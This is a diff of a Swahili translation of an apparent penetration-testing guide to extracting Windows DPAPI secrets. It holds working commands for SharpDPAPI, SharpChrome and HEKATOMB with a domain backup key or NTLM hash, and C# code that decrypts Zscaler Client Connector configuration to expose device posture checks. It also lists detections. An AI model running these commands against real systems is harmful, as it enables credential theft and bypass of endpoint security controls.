-Katika **SharpDPAPI and SharpChrome** unaweza kutumia chaguo la **`/server:HOST`** ili kufikia data za mashine ya mbali. Bila shaka unahitaji uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kuwa **domain backup encryption key is known**:
+Katika **SharpDPAPI and SharpChrome** unaweza kubainisha chaguo **`/server:HOST`** ili kufikia data za mashine ya mbali. Bila shaka unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kwamba **domain backup encryption key is known**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
 ```
-## Other tools
+## Zana nyingine
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayoendesha kwa otomatiki uondoaji wa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP pamoja na uondoaji wa domain controller backup key kupitia RPC. Script itaamua anwani za IP za kompyuta zote kisha itafanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kuzoea kusigma kila kitu kwa domain backup key.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayoboreshwa kutoa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na kuchoma key ya backup ya domain controller kupitia RPC. Script itakayofuata itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata blobs zote za DPAPI za watumiaji wote na kufungua kila kitu kwa kutumia domain backup key.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Kwa orodha ya kompyuta zilizotolewa kutoka LDAP unaweza kupata kila subnet hata kama hukujua!
+Kwa orodha ya kompyuta iliyoichimbuliwa kutoka LDAP unaweza kupata kila subnet hata kama hukuwajua!
 
 ### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kutoa siri zilizolindwa na DPAPI kiotomatiki. Toleo la 2.x liliweka:
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kuchoma siri zilizopewa ulinzi na DPAPI moja kwa moja. Toleo la 2.x liliweka:
 
-* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya hosts
-* Uchanganaji wa masterkeys za **context 3** na utekelezaji wa kuunganisha moja kwa moja na Hashcat kwa cracking
-* Msaada kwa cookies zilizo enkryptwa za Chrome "App-Bound" (angalia sehemu inayofuata)
-* Mode mpya ya **`--snapshot`** ya kuchunguza mara kwa mara endpoints na kutofautisha blobs zilizoundwa mpya
+* Ukusanyaji sambamba wa blobs kutoka mamia ya hosts
+* Ufafanuzi wa masterkeys za **context 3** na ujumuishaji wa Hashcat kwa uvetesaji wa kiotomatiki
+* Msaada kwa Chrome "App-Bound" encrypted cookies (angalia sehemu inayofuata)
+* Mode mpya ya **`--snapshot`** ili kuzunguka mara kwa mara endpoints na kutofautisha blobs zilizoundwa mpya
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa masterkey/credential/vault files ambayo inaweza kutoa format za Hashcat/JtR na kwa hiari kuita cracking kiotomatiki. Inaunga mkono kikamilifu miundo ya masterkey ya machine na user hadi Windows 11 24H1.
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na hiari kuitisha cracking kiotomatiki. Inaunga mkono kikamilifu machine na user masterkey formats hadi Windows 11 24H1.
 
-## Common detections
+## Utambuzi wa kawaida
 
-- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
-- Haswa kutoka network share kama **C$** au **ADMIN$**.
-- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana za kupata kumbukumbu ya LSASS au kuchoma masterkeys.
-- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na ufikiaji wa kitu **`BCKUPKEY`**.
-- Event **4673/4674** wakati mchakato unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)
+- Kufikia faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
+- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
+- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana ili kufikia kumbukumbu ya LSASS au kuchoma masterkeys.
+- Event **4662**: *An operation was performed on an object* – inaweza kuunganishwa na upatikanaji wa kitu **`BCKUPKEY`**.
+- Event **4673/4674** wakati mchakato unapokuwa unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)
 
 ---
-### 2023-2025 vulnerabilities & ecosystem changes
+### Udhaifu & mabadiliko ya mazingira 2023–2025
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Mshambuliaji mwenye ufikiaji wa mtandao angeweza kudanganya domain member ili ipakue DPAPI backup key ya hasidi, kuruhusu kusomewa kwa masterkeys za watumiaji. Imetengenezwa kwenye cumulative update ya November 2023 – wasimamizi wanapaswa kuhakikisha DCs na workstations zimepatchiwa kikamilifu.
-* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha ulinzi wa zamani uliotegemea DPAPI pekee kwa kuongeza ufunguo wa ziada uliohifadhiwa ndani ya **Credential Manager** ya mtumiaji. Kufungua cookies offline sasa kunahitaji DPAPI masterkey pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zina uwezo wa kupata ufunguo wa ziada ikiwa zinaendeshwa katika muktadha wa mtumiaji.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambulizi mwenye upatikanaji wa mtandao angeweza kumdanganya mwanachama wa domain kuvuta DPAPI backup key mbaya, kuruhusu ufunguzo wa masterkeys za watumiaji. Imefikishwa patishi katika cumulative update ya Novemba 2023 – wasimamizi wanapaswa kuhakikisha DCs na workstations zimepatishwa kabisa.
+* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha ulinzi wa DPAPI pekee kwa kuongezea key iliyohifadhiwa chini ya **Credential Manager** ya mtumiaji. Uvunaji wa cookies bila mtandao sasa unahitaji masterkey ya DPAPI pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zina uwezo wa kuponya key ya ziada zinapotekelezwa kwa muktadha wa mtumiaji.
 
-### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID
+### Uchunguzi wa Kesi: Zscaler Client Connector – Entropy Maalum Iliyotokana na SID
 
-Zscaler Client Connector inaweka mafaili kadhaa ya usanidi chini ya `C:\ProgramData\Zscaler` (mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefungwa kwa **DPAPI (Machine scope)** lakini muuzaji hutoa **custom entropy** ambayo *inahesabiwa wakati wa utekelezaji* badala ya kuhifadhiwa kwenye diski.
+Zscaler Client Connector inahifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefungwa kwa **DPAPI (Machine scope)** lakini vendor hutoa **entropy maalum** inayohesabiwa wakati wa utekelezaji badala ya kuhifadhiwa diski.
 
-Entropy inajengwa upya kutoka vipengele viwili:
+Entropy hiyo inajengwa upya kutoka kwa vipengele viwili:
 
-1. Siri iliyowekwa kwa hard-coded ndani ya `ZSACredentialProvider.dll`.
-2. The **SID** ya akaunti ya Windows ambayo usanidi unamuwekwa.
+1. Siri iliyowekwa kwa nguvu ndani ya `ZSACredentialProvider.dll`.
+2. The **SID** ya akaunti ya Windows ambayo usanidi unamilikiwa nayo.
 
-The algorithm implemented by the DLL is equivalent to:
+Algorithm inayotekelezwa na DLL ni sawa na:
 ```csharp
 byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
 byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
@@ -402,15 +404,15 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-Kwa kuwa siri imeingizwa ndani ya DLL ambayo inaweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kuunda upya entropy kwa SID yoyote** na decrypt blobs offline:
+Kwa sababu siri imewekwa ndani ya DLL ambayo inaweza kusomwa kutoka diski, **mshambuliaji wa ndani yeyote mwenye haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na decrypt the blobs offline:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Ufichaji hutoa usanidi kamili wa JSON, ikiwa ni pamoja na kila **device posture check** na thamani yake inayotarajiwa — taarifa ambayo ni ya thamani kubwa wakati wa kujaribu client-side bypasses.
+Ufichaji (decryption) hutoa usanidi kamili wa JSON, ikijumuisha kila **device posture check** na thamani yake iliyotarajiwa – taarifa ambayo ni ya thamani kubwa wakati wa kujaribu client-side bypasses.
 
-> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.
+> TIP: vibaki vingine vilivyofichwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) vinalindwa na DPAPI **bila** entropy (`16` zero bytes). Kwa hiyo vinaweza kufunguliwa moja kwa moja kwa kutumia `ProtectedData.Unprotect` mara tu ruhusa za SYSTEM zitakapopatikana.
 
 ## Marejeo
 
